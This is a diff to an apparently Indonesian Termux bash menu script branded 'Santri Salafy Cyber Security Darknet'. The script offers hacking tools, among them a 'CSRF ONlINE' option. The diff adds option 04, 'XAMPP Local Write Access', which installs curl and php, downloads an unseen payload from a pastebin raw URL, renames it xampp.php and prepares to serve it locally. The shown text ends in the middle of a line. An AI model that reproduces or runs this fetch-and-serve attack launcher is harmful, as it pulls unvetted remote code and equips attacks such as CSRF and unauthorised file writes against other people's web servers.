@@ -7,10 +7,13 @@ echo "#                            #"
 echo "# 01 Server PHP Martabak SQL #"
 echo "# 02 PHP Server              #"
 echo "# 03 CSRF ONlINE             #"
+echo "# 04 XAMPP Local Write Access#"
 echo "##############################"
 echo "#    Santri Salafy Cyber     #"
 echo "#    Security Darknet        #"
+echo "#     One Squad Team         #"
 echo "##############################"
+
 
 read -p "Pilih_Nomor~#/ " n;
 
@@ -58,3 +61,13 @@ menghentikan"
 mv 1eftY8Pq csrf.php
 php -S 127.0.0.1:8080 csrf.php
 fi
+
+if [ $n = 04 ] || [ $n = 4 ];then
+pkg install curl
+pkg install php
+curl -LO https://pastebin.com/raw/efCRvgFZ
+mv efCRvgFZ xampp.php
+clear
+echo "<=====[ Info ]=====>"
+echo "Nama Server: 127.0.0.1:8080"
+echo "Ketik CTRL+C untuk exit atau
